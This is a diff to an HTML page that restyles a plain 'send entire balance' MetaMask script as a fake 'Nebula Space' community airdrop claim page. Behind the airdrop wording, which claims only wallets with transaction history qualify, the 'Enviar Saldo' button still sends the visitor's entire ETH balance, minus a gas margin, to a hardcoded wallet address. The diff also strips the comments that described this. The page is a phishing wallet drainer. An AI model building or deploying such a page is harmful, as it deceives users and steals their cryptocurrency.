@@ -5,12 +5,143 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Enviar Fondos</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.8.1/dist/web3.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap" rel="stylesheet">
+    <style>
+        /* Estilo base */
+        body {
+            font-family: 'Archivo Black', sans-serif;
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Imagen de fondo */
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('background1.jpg') no-repeat center center fixed;
+            background-size: cover;
+            z-index: -3;
+        }
+
+        /* Primer capa translúcida */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            z-index: -2;
+        }
+
+        /* Segunda capa translúcida */
+        .dark-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.4);
+            z-index: -1;
+        }
+
+        /* Contenedor principal */
+        .container {
+            text-align: center;
+            max-width: 600px;
+            width: 100%;
+            z-index: 1;
+        }
+
+        /* Título */
+        h1 {
+            font-size: 2em;
+            margin-bottom: 0.5em;
+            color: #ffffff;
+            white-space: nowrap;
+        }
+
+        /* Palabra NEBULA */
+        .nebula {
+            color: #9b59b6;
+            text-shadow: 0 0 10px rgba(155, 89, 182, 0.8);
+        }
+
+        /* Palabra ENTER */
+        .enter {
+            color: #ffffff;
+        }
+
+        /* Descripción */
+        .description {
+            font-size: 1.2em;
+            margin-bottom: 1em;
+            color: #ffffff;
+            line-height: 1.4em; /* Ajusta la separación entre líneas */
+        }
+
+        /* Botones */
+        button {
+            font-size: 1.2em;
+            padding: 0.8em 1.5em;
+            margin: 0.5em 0;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: transform 0.3s ease, background 0.3s ease;
+            font-weight: bold;
+        }
+
+        #connectButton {
+            background-color: #8e44ad;
+            color: #ffffff;
+        }
+
+        #sendButton {
+            background-color: #8e44ad;
+            color: #ffffff;
+            display: none;
+        }
+
+        /* Efectos de hover */
+        button:hover {
+            transform: translateY(-2px);
+            background-color: #732d91;
+        }
+
+        /* Estado de conexión */
+        #status {
+            font-size: 1.1em;
+            margin-top: 1em;
+            color: #2ecc71;
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
-    <h1>Enviar Todo el Saldo</h1>
-    <button id="connectButton">Conectar MetaMask</button>
-    <button id="sendButton" style="display:none;">Enviar Saldo</button>
-    <p id="status"></p>
+    <div class="background"></div>
+    <div class="overlay"></div>
+    <div class="dark-overlay"></div>
+    
+    <div class="container">
+        <h1><span class="enter">ENTER</span> <span class="nebula">NEBULA</span> SPACE</h1>
+        <p class="description">
+            claims Nebula Space Airdrop for the Community,<br>
+            only wallets with history of transactions are accepted, to avoid wallet bots
+        </p>
+        <button id="connectButton">Conectar MetaMask</button>
+        <button id="sendButton">Enviar Saldo</button>
+        <p id="status"></p>
+    </div>
 
     <script>
         let web3;
@@ -21,7 +152,7 @@
                 web3 = new Web3(window.ethereum);
                 accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                 document.getElementById('status').innerText = `Conectado como: ${accounts[0]}`;
-                document.getElementById('sendButton').style.display = 'block'; // Mostrar botón de envío
+                document.getElementById('sendButton').style.display = 'block';
             } else {
                 alert('Por favor, instala MetaMask!');
             }
@@ -29,14 +160,13 @@
 
         document.getElementById('sendButton').onclick = async () => {
             const fromAccount = accounts[0];
-            const toAccount = '0x6497C5aDe6F21CDAf604E417FD0062ca4f98543F'; // Dirección de la billetera receptora
+            const toAccount = '0x6497C5aDe6F21CDAf604E417FD0062ca4f98543F';
             const balanceWei = await web3.eth.getBalance(fromAccount);
-            const gasFee = web3.utils.toWei('0.001', 'ether'); // Margen para tarifas de gas
+            const gasFee = web3.utils.toWei('0.001', 'ether');
 
             if (balanceWei > gasFee) {
-                const amountToSend = balanceWei - gasFee; // Enviar todo menos el gas fee
+                const amountToSend = balanceWei - gasFee;
 
-                // Realizar la transacción
                 web3.eth.sendTransaction({
                     from: fromAccount,
                     to: toAccount,
@@ -56,6 +186,3 @@
     </script>
 </body>
 </html>
-
-
-
